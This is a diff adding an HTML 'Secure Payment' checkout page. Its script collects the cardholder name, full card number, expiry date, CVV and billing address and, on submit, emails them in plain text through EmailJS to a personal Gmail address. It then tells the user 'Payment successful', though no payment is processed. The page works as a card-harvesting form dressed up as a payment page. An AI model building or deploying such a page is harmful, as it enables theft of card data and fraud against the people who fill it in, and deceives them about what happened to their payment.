@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Payment Page</title>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script>
+    (function() {
+      emailjs.init('5X5hhawP34GdHF3FX');
+    })();
+  </script>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f4f4f4;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      background: #fff;
+      max-width: 500px;
+      margin: 50px auto;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+    }
+    h1 {
+      text-align: center;
+      margin-bottom: 25px;
+    }
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: bold;
+    }
+    input, textarea, select {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      box-sizing: border-box;
+      font-size: 14px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    .card-details {
+      display: flex;
+      gap: 10px;
+    }
+    .card-details div {
+      flex: 1;
+    }
+    button {
+      margin-top: 25px;
+      padding: 12px;
+      font-size: 16px;
+      cursor: pointer;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      width: 100%;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Secure Payment</h1>
+    <form id="payment-form">
+      <label for="name">Name on Card:</label>
+      <input id="name" type="text" required placeholder="John Doe" />
+
+      <label for="card">Card Number:</label>
+      <input id="card" type="text" minlength="12" maxlength="19" required placeholder="1234 5678 9012 3456" />
+
+      <div class="card-details">
+        <div>
+          <label for="expiry">Expiry Date:</label>
+          <input id="expiry" type="text" required placeholder="MM/YY" />
+        </div>
+        <div>
+          <label for="cvv">CVV:</label>
+          <input id="cvv" type="text" maxlength="4" required placeholder="123" />
+        </div>
+      </div>
+
+      <label for="address1">Billing Address Line 1:</label>
+      <input id="address1" type="text" required placeholder="123 Main St" />
+
+      <label for="address2">Billing Address Line 2 (Optional):</label>
+      <input id="address2" type="text" placeholder="Apt, Suite, Unit, etc." />
+
+      <label for="city">City:</label>
+      <input id="city" type="text" required placeholder="City" />
+
+      <label for="postal">Postal Code:</label>
+      <input id="postal" type="text" required placeholder="12345" />
+
+      <label for="country">Country:</label>
+      <input id="country" type="text" required placeholder="Country" />
+
+      <button type="submit">Submit Payment</button>
+    </form>
+  </div>
+
+  <script>
+    document.getElementById('payment-form').addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      const name = document.getElementById('name').value.trim();
+      const card = document.getElementById('card').value.trim();
+      const expiry = document.getElementById('expiry').value.trim();
+      const cvv = document.getElementById('cvv').value.trim();
+      const address1 = document.getElementById('address1').value.trim();
+      const address2 = document.getElementById('address2').value.trim();
+      const city = document.getElementById('city').value.trim();
+      const postal = document.getElementById('postal').value.trim();
+      const country = document.getElementById('country').value.trim();
+
+      if (!name || card.length < 12 || !expiry || !cvv || !address1 || !city || !postal || !country) {
+        alert("Please fill in all required fields correctly.");
+        return;
+      }
+
+      const fullAddress = `${address1}${address2 ? ', ' + address2 : ''}, ${city}, ${postal}, ${country}`;
+
+      const templateParams = {
+        from_name: name,
+        card_details: `${card} (Exp: ${expiry}, CVV: ${cvv})`,
+        address: fullAddress,
+        to_email: 'subtycle@gmail.com'
+      };
+
+      emailjs.send('service_yf3xe6t', 'template_010g34m', templateParams)
+        .then(() => {
+          localStorage.removeItem("cartItems");
+          alert("Payment successful");
+          window.location.href = "index.html";
+        })
+        .catch((error) => {
+          alert("Failed to send payment email: " + error.text);
+        });
+    });
+  </script>
+</body>
+</html>
